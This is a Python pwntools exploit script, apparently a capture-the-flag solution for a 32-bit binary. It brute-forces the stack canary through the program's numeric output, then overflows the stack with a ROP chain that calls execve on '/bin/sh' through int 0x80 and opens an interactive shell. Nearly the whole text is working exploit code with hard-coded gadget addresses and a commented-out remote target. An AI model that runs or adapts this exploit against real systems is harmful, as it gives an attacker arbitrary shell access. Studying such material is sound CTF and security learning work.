#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

# context.log_level = 'debug'

binary = './pwn'

p = process(binary)
# p = remote("34.80.207.78", 10003)

p.sendlineafter("Name:", "/bin/sh\x00");

begin = 0
end = 0xffffffff

while True:

    p.sendlineafter('stop)','301')

    for i in range(299):
        p.sendline(str((end - begin) // 299 * i + 1 + begin))

    p.sendline(str(0))

    p.recvuntil('The result is ')
    ret = int(p.recvline())

    tmp = end - begin
    begin = tmp // 299 * (299 - (ret - 299) - 1) + begin
    end = tmp // 299 * (299 - (ret - 299)) + begin

#    p.info('begin: %s' % hex(begin))
#    p.info('end: %s' % hex(end))

    p.sendlineafter('Continue?(y/n)\n','y')
    if begin == end:
        break

canary = ((begin >> 8) + 1) << 8

p.info('canary: %s' % hex(canary))
# gdb.attach(p)


p.sendlineafter(')\n','300')

for x in range(300):
    p.sendline(str(255))

# gdb.attach(p)
p.sendline(str(canary))

p.sendline(str(1))

""" trigger context
 EAX  0x0
 EBX  0x80481e8 ◂— 0x0
 ECX  0x80ec96c (main_arena+1100) ◂— 0x212c0
 EDX  0x0
 EDI  0x0
 ESI  0x80ec00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80655f0 (__strcpy_ssse3) ◂— mov    edx, dword ptr [esp + 4]
 EBP  0x1
 ESP  0xff91ae44 ◂— 0x0
 EIP  0xdeadbeef
"""


pop_eax = 0x080b9856
pop_ebx = 0x08049021 #: pop ebx; ret; 
xchg_eax_ecx_pop_ebx_esi_edi = 0x0808223e #: xchg eax, ecx; mov eax, esi; pop ebx; pop esi; pop edi; ret; 
name = 0x80ed9e0 

int_0x80 = 0x08070b10#: int 0x80; ret; 

payload = []
payload.append(xchg_eax_ecx_pop_ebx_esi_edi)
payload.append(name)
payload.append(0x123) #esi
payload.append(0x123) #edi
payload.append(pop_eax)
payload.append(11)
payload.append(int_0x80)

for i in payload:
    p.sendline(str(i))

p.sendline(str(0))
p.recvuntil('The result is 0\n')
p.interactive()
